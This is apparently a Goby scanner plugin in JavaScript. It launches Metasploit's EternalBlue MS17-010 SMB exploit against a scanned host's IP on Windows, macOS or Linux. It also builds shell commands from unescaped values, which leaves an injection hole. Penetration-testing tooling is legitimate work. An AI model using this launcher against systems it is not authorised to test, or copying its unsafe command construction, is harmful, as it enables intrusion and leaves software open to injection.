let cp = require('child_process');
const os = require('os');
const fs = require('fs');

function activate(content) {
    //msf 对应关系
    let identical = {
        "Eternalblue/DOUBLEPULSAR MS17-010 SMB RCE": "exploit/windows/smb/ms17_010_eternalblue"
    };

    goby.registerCommand('msf', function (content) {
        let config = goby.getConfiguration();
        let ip = content.hostinfo.split(':')[0];
        let arr = ['C:/metasploit-framework/bin/msfconsole.bat', 'D:/metasploit-framework/bin/msfconsole.bat', 'C:/metasploit-framework/msfconsole'];

        let urlDefault = '';
        if (config.Path.default) {
            urlDefault = config.Path.default
        } else {
            let isExistence = arr.filter(v => {
                return fs.existsSync(v)
            })
            urlDefault = isExistence[0];
            goby.setConfiguration("Path", urlDefault)
        }

        if (!urlDefault) return goby.showInformationMessage('Please set the plug-in installation path');

        let url = `${urlDefault} -x "use ${identical[content.name]}; set rhosts ${ip} ; run"`
        if (os.type() == 'Windows_NT') {
            //windows
            cp.exec(`start ${url}`)
        } else if (os.type() == 'Darwin') {
            //mac
            var onlyPath = require('path').dirname(urlDefault)
            url = `cd ${onlyPath}; ./msfconsole -x \\"use ${identical[content.name]}; set rhosts ${ip} ; run\\"`
            cmd = `osascript -e 'tell application "Terminal" to do script "${url}"'`
            cp.exec(cmd)
        } else if (os.type() == 'Linux') {
            //Linux
            //cp.exec(`bash -c "${url}"`)
            cp.exec(`echo '${url}' > msf_sploit.sh`)
            cp.exec(`x-terminal-emulator -e sh msf_sploit.sh`)
        }
    });

    goby.registerCommand('msf_visi', function (content) {
        if (identical[content.name]) return true;
        return false;
    });
}

exports.activate = activate;
